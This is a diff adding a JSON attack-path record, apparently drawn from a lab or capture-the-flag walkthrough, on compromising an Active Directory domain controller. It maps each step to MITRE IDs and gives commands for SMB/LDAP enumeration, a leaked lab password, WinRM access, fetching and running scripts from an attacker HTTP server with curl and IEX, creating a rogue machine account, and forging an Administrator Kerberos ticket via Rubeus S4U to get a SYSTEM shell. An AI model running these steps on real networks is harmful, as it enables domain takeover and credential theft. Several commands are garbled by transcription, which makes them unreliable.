@@ -1,0 +1,146 @@
+{
+  "id": "ap-0037",
+  "title": "Escalation: LDAP Credential Harvesting -> GenericAll Abuse -> S4U Delegation",
+  "summary": "Exploiting hardcoded LDAP credentials discovered via traffic sniffing/static analysis to gain initial access, enumerating Active Directory (AD) for a high-value shared account password stored in the 'info' field, and escalating privileges using the GenericAll abuse technique combined with machine account creation to forge an Administrator Kerberos ticket via S4U.",
+  "attack_path_markdown": "### Step 1: Initial Enumeration\nScan targets and enumerate SMB shares to find interesting files.\n### Step 2: Credential Access\nAnalyze the .NET application (`userinfo.exe`) to find hardcoded LDAP credentials.\n### Step 3: Detailed AD Enumeration\nUse `ldapsearch` with the `ldap` user credentials to dump all user attributes, discovering the `support` user's password stored in the `info` field.\n### Step 4: Initial Foothold and Privilege Escalation\nUse the `support` user credentials to gain a WinRM session on the Domain Controller (DC) and identify 'GenericAll' permissions over the DC.\n### Step 5: Machine Account Abuse (Lateral Movement)\nCreate a new computer account, set its delegation attributes (`msDS-AllowedToActOnBehalfOfOtherIdentity`), and execute an S4U attack using Rubius to forge a Kerberos ticket for the Administrator.\n### Step 6: Actions on Objectives\nConvert the ticket and use `psexec.py` to gain NT Authority\\SYSTEM access on the DC.",
+  "kill_chain": [
+    {
+      "phase_order": 1,
+      "phase_name": "Reconnaissance",
+      "description": "Initial system scanning and enumeration of open services (Kerberos/LDAP, SMB) and discovery of non-standard file shares.",
+      "actions": [
+        "Run Nmap scan to identify open ports and services: `nmap -sC -sV -oA support 10.10.11.174`",
+        "Enumerate SMB shares with CrackMapExec (CME): `crack map exec SMB 10 10 11.174` ",
+        "Try null/anonymous authentication to find shares: `crack map exec SMB 10 10 11.174 --shares` ",
+        "Access the `support-tools` share: `SMB client -N 10 10 11 174 support-tools` ",
+        "Download suspicious file: `get user info.exe.zip` (executed within smbclient) "
+      ],
+      "tools": ["nmap", "crack map exec", "smbclient"],
+      "techniques": ["T1595.002 (Active Scanning)", "T1021.002 (SMB/Windows Admin Shares)"],
+      "mitre_ids": ["T1595.002", "T1021.002"],
+      "indicators": ["Open ports 53, 88, 135, 139, 445, 464, 5985", "Discovery of domain `support.hdb`", "Downloaded application binary `userinfo.exe.zip`"],
+      "preconditions": "Network connectivity to the target",
+      "expected_outcome": "Identification of services and initial data artifact (binary)",
+      "confidence": 1.0
+    },
+    {
+      "phase_order": 2,
+      "phase_name": "Weaponization",
+      "description": "Analyzing the discovered application statically or dynamically (Wireshark) to extract hardcoded LDAP credentials required for further enumeration.",
+      "actions": [
+        "Add domain resolution to host file: `sudo VI /etc/hosts` (add line: `10 10 11 174 support.hdb`) ",
+        "Start network traffic monitor: `pseudo Wireshark` (filtering on the relevant interface) ",
+        "Execute the binary to trigger connection attempt: `user info.exe -v find ipsec` (or any parameters to run) ",
+        "Observe LDAP bind request in Wireshark to extract username (`ldap@support.hdb`) and plaintext password (Simple Authentication) ",
+        "*(Alternative: Decompile with dnSpy, identify Base64/XOR encryption logic, and use CyberChef to decode the hardcoded password string)* "
+      ],
+      "tools": ["Wireshark", "dnSpy", "CyberChef", "userinfo.exe"],
+      "techniques": ["T1027 (Obfuscated Files or Information)", "T1552.001 (Credentials in Files)"],
+      "mitre_ids": ["T1027", "T1552.001"],
+      "indicators": ["LDAP Bind Request containing cleartext credentials", "Decrypted password string for user `ldap`"],
+      "preconditions": "Ability to execute the binary or perform static analysis",
+      "expected_outcome": "Valid credentials for the `ldap` user",
+      "confidence": 1.0
+    },
+    {
+      "phase_order": 3,
+      "phase_name": "Delivery",
+      "description": "Utilizing the initial `ldap` credentials to perform detailed Active Directory enumeration, bypassing automated tool limitations to find higher-privileged credentials.",
+      "actions": [
+        "Validate `ldap` credentials: `crack map exec SMB 10 10 11 174 -u ldap -p <ldap_password> -D support` ",
+        "Run Bloodhound for initial data collection: `bloodhound.pi -c all -nS 10 10 11 174 -d support.hdb -u ldap -p <ldap_password>` ",
+        "Manually dump all AD user attributes, searching for credentials missed by automated tools (e.g., Bloodhound): `ldap search -H support.htb -D ldap@support.hdb -w <ldap_password> -b \"DC=support,DC=hdb\" > ldap.out` ",
+        "Search the output file for the `support` user and the `info` attribute to locate the new password: `cat ldap.out | grep -i 'cn=support'` and find the `info` field "
+      ],
+      "tools": ["crack map exec", "bloodhound.py", "ldapsearch"],
+      "techniques": ["T1087.002 (Active Directory Object Query)", "T1552.001 (Credentials in AD attributes)"],
+      "mitre_ids": ["T1087.002", "T1552.001"],
+      "indicators": ["`support` user password (`iron47pleasure40watchful`) stored in the `info` field"],
+      "preconditions": "`ldap` user credentials with read access to AD",
+      "expected_outcome": "Discovery of `support` user password",
+      "confidence": 1.0
+    },
+    {
+      "phase_order": 4,
+      "phase_name": "Exploitation",
+      "description": "Gaining an interactive session on the Domain Controller using the `support` user credentials and identifying a critical privilege escalation vector (GenericAll).",
+      "actions": [
+        "Establish remote interactive session using WinRM: `evil-winrm -i 10 10 11 174 -u support -p <support_password>` ",
+        "Use Bloodhound analysis or PowerView to confirm the `support` user (or its group, 'shared support') holds the **'GenericAll'** permission over the DC machine object "
+      ],
+      "tools": ["evil-winrm", "Bloodhound (GUI analysis)"],
+      "techniques": ["T1021.006 (WinRM)", "T1207 (AD Object Manipulation via GenericAll)"],
+      "mitre_ids": ["T1021.006", "T1207"],
+      "indicators": ["Successful WinRM shell prompt on the DC", "Confirmation of GenericAll control over the DC object"],
+      "preconditions": "Valid credentials for `support` user",
+      "expected_outcome": "Interactive shell access on the DC and confirmation of high privilege abuse opportunity",
+      "confidence": 1.0
+    },
+    {
+      "phase_order": 5,
+      "phase_name": "Installation",
+      "description": "Staging necessary PowerShell scripts (PowerMad, PowerView) and the Rubius binary onto the DC environment via the WinRM session.",
+      "actions": [
+        "Navigate to a world-writable directory: `cd C:\\ProgramData` ",
+        "Set up local HTTP server on the attacker machine: `python3 -m http.server 8000` ",
+        "Download Rubius executable: `curl 10.10.14.8:8000/rubius.exe -o rubius.exe` ",
+        "Load PowerMad script into memory: `IEX (new-object net.webclient).downloadstring('http://10.10.14.8:8000/powermad.ps1')` ",
+        "Check Machine Account Quota (MAQ): `Get-DomainObject -Identity \"DC=support,DC=htb\" -Select ms-DS-MachineAccountQuota` (confirms MAQ is 10) "
+      ],
+      "tools": ["curl", "PowerMad.ps1", "Rubius.exe", "Python HTTP Server"],
+      "techniques": ["T1105 (Ingress Tool Transfer)"],
+      "mitre_ids": ["T1105"],
+      "indicators": ["Tools successfully downloaded and scripts loaded", "MAQ check returns a value greater than 0"],
+      "preconditions": "WinRM session established and required tools staged on attacker machine",
+      "expected_outcome": "Environment ready for AD object manipulation",
+      "confidence": 1.0
+    },
+    {
+      "phase_order": 6,
+      "phase_name": "Command and Control",
+      "description": "Abusing the GenericAll permission by creating and configuring a rogue machine account for constrained delegation (S4U) abuse.",
+      "actions": [
+        "Create a new machine account with a known password using PowerMad: `New-MachineAccount -Name 'fakecomputer' -Password 'PleaseSubscribe123!'` ",
+        "Retrieve the Security Identifier (SID) of the new machine account: `Get-ComputerSid -ComputerName 'fakecomputer'`",
+        "Construct the necessary security descriptor bytes (ACE) [20]",
+        "Apply the delegation privilege to the machine account using GenericAll: `Get-DomainComputer -Identity fakecomputer | Set-DomainObject -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity'=$SDBytes}` "
+      ],
+      "tools": ["PowerMad (New-MachineAccount, Get-ComputerSid, Set-DomainObject)"],
+      "techniques": ["T1558.003 (S4U2Self and S4U2Proxy preconditions)", "T1098.003 (AD Computer Account)"],
+      "mitre_ids": ["T1558.003", "T1098.003"],
+      "indicators": ["New computer account (`fakecomputer`) successfully created and configured in AD with delegation rights"],
+      "preconditions": "GenericAll privilege over the DC and loaded PowerMad script",
+      "expected_outcome": "Rogue computer account configured to impersonate other users via Kerberos delegation",
+      "confidence": 1.0
+    },
+    {
+      "phase_order": 7,
+      "phase_name": "Actions on Objectives",
+      "description": "Executing the S4U delegation attack to impersonate 'Administrator', retrieving the Kerberos Ticket Granting Service (TGS) ticket, and using it for SYSTEM access.",
+      "actions": [
+        "Generate the RC4-HMAC hash of the machine account password: `rubius.exe hash /password:PleaseSubscribe123!` ",
+        "Execute the S4U delegation attack to impersonate the Administrator and pass the ticket (PTT): `rubius.exe s4u /self:fakecomputer\$ /rc4:<rc4_hash> /impersonateuser:administrator /altservice:DC.support.hdb /ptt`",
+        "Copy the resulting Base64 ticket to the attacker machine (e.g., `ticket.kirby`) ",
+        "Decode the ticket for Impacket compatibility: `base64 -d ticket.kirby > ticket.ccache` ",
+        "Set the environment variable to use the ticket: `kb5cc name=ticket.ccache`",
+        "Execute remote command (SYSTEM shell) using the forged ticket: `psexec.py administrator@dc.support.htb -k -no-pass` ",
+        "Retrieve objective: `type root.text` "
+      ],
+      "tools": ["Rubius.exe", "base64", "psexec.py (Impacket)"],
+      "techniques": ["T1558.003 (S4U2Self and S4U2Proxy)", "T1078 (Valid Accounts)"],
+      "mitre_ids": ["T1558.003", "T1078"],
+      "indicators": ["Generated RC4-HMAC hash", "Kerberos ticket (`.ccache`) created", "NT Authority\\SYSTEM shell prompt"],
+      "preconditions": "Properly configured `fakecomputer` object and Impacket installed",
+      "expected_outcome": "SYSTEM level access on the Domain Controller",
+      "confidence": 1.0
+    }
+  ],
+  "tactics": ["Reconnaissance", "Credential Access", "Discovery", "Initial Access", "Privilege Escalation", "Lateral Movement", "Impact"],
+  "techniques": ["T1021.006 (WinRM)", "T1558.003 (S4U)", "T1552.001 (Credentials in Files)", "T1098.003 (AD Computer Account)", "T1207 (Domain Object Control)"],
+  "mitre_ids": ["T1021.006", "T1558.003", "T1552.001", "T1098.003", "T1207"],
+  "hosts": ["10.10.11.174", "support.hdb", "dc.support.hdb"],
+  "privs_obtained": ["domain user (ldap)", "domain user (support)", "Domain Admin (Administrator)", "NT Authority\\SYSTEM"],
+  "confidence": 1.0,
+  "notes": "The success of the final stage relies on Kerberos authentication which is sensitive to clock skew, requiring synchronization if the attack fails initially [25]. The discovery phase requires manual LDAP dumping because the password was stored in the non-standard 'info' attribute [13, 15].",
+  "labels": ["attack_path", "kerberos", "ldap", "genericall", "s4u", "domain-controller"]
+}
